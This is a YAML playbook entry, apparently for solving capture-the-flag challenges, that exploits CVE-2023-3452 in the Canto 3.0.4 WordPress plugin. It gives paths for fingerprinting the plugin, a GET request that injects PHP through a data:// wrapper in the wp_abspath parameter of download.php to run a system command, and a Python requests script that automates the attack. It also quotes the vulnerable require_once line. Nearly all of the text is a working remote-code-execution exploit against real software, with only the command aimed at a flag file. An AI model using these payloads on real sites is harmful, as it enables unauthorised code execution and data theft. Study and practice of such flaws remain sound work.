name: canto_wordpress_plugin_lfi_cve_2023_3452
category: web
tags: [cve, wordpress, lfi, cve-2023-3452, plugin]
indicators:
  - "Canto 3.0.4"
  - "WordPress plugin"
  - "download.php"
  - "wp_abspath parameter"

tricks:
  - name: "Step 1: Identify vulnerable plugin"
    when: "Found Canto plugin"
    how: "Canto 3.0.4 has LFI vulnerability (CVE-2023-3452)"
    payload: |
      /wp-content/plugins/canto/readme.txt
      /wp-content/plugins/canto/includes/lib/download.php

  - name: "Step 2: LFI via data:// wrapper"
    when: "Execute arbitrary PHP code"
    how: "Use data:// wrapper in wp_abspath parameter"
    payload: |
      GET /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=data://text/plain,<?php system("cat /FLAG.txt"); ?>&subdomain=x&app_api=x&id=x

  - name: "Step 3: Extract the flag"
    when: "Get flag"
    how: "Use LFI to execute command and read file"
    payload: |
      url = f"{TARGET}/wp-content/plugins/canto/includes/lib/download.php"
      payload = 'data://text/plain,<?php system("cat /FLAG.txt"); ?>'
      params = {'wp_abspath': payload, 'subdomain': 'x', 'app_api': 'x', 'id': 'x'}
      resp = requests.get(url, params=params)

  - name: "Vulnerability explanation"
    when: "Understand vulnerability"
    how: "require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php') unsanitized"
    payload: |
      # Vulnerable code:
      require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php');
      # Exploit: wp_abspath=data://text/plain,<?php MALICIOUS_CODE ?>

